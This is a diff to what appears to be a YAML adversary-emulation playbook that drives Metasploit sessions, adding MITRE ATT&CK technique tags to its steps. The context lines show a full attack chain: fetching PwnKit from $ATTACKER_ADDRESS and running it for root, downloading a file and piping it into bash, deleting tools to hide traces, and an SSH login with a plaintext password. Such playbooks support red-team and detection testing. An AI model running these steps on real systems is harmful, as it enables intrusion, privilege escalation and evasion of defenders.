@@ -52,7 +52,6 @@ commands:
       techniques: "T1190,T1059"
       tactics: "Initial Access
 
-
   - type: msf-session
     stdapi: True
     session: "foothold"
@@ -67,7 +66,6 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-
 
   - type: msf-session
     cmd: shell
@@ -132,11 +130,17 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: wget http://$ATTACKER_ADDRESS/PwnKit > /dev/null 2>&1
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: msf-session
     cmd: chmod +x PwnKit && ./PwnKit
@@ -149,11 +153,17 @@ commands:
     cmd: id
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "foothold"
     cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: msf-session
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
@@ -167,22 +177,30 @@ commands:
     cmd: rm /root/README.txt
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1070"
+      tactics: "Defense Evasion"
 
   - type: msf-session
     cmd: exit
     session: "foothold"
     end_str: "PWN >"
 
-
   - type: msf-session
     cmd: rm ./PwnKit
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1070"
+      tactics: "Defense Evasion"
 
   - type: msf-session
     cmd: rm linpeas.sh
     session: "foothold"
     end_str: "PWN >"
+    metadata:
+      techniques: "T1070"
+      tactics: "Defense Evasion"
 
   - type: msf-session
     cmd: exit
@@ -198,6 +216,9 @@ commands:
     username: debian
     password: haveityourway
     creates_session: "rootshell"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
